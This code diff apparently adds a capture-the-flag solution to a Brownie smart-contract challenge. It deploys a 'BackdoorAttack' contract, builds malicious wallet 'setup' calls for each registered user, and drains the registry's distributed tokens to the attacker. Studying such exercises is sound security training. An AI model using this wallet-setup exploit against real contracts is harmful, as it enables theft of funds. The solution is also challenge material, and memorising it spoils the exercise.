@@ -74,6 +74,43 @@ def test_solve_challenge():
     ##############################
     ##### SOLUTION GOES HERE #####
     ##############################
+
+    # import attacker fallback contract
+    from brownie import BackdoorAttack
+
+    # deploy attacker contract
+    attacker_contract = BackdoorAttack.deploy(
+        master_copy.address,
+        wallet_registry.address,
+        wallet_factory.address,
+        _fromAttacker
+    )
+
+    # malicious calls list
+    malicious_setup_calls = []
     
+    # loop over addresses
+    for user in users: 
+
+        # setup call encoding from master copy
+        malicious_setup_calls.append(
+            master_copy.setup.encode_input(
+                [user],
+                1,
+                ZERO_ADDRESS,
+                0,
+                token.address,
+                ZERO_ADDRESS,
+                0,
+                ZERO_ADDRESS
+            )
+        )
+
+    # transfer tx
+    token_stealing_call = token.transfer.encode_input(attacker.address, AMOUNT_TOKENS_DISTRIBUTED // len(users))
+
+    # deploy safes and steal all tokens
+    attacker_contract.deploySafesAndStealTokens(malicious_setup_calls, token_stealing_call, _fromAttacker)
+
     ######################
     check_solution()
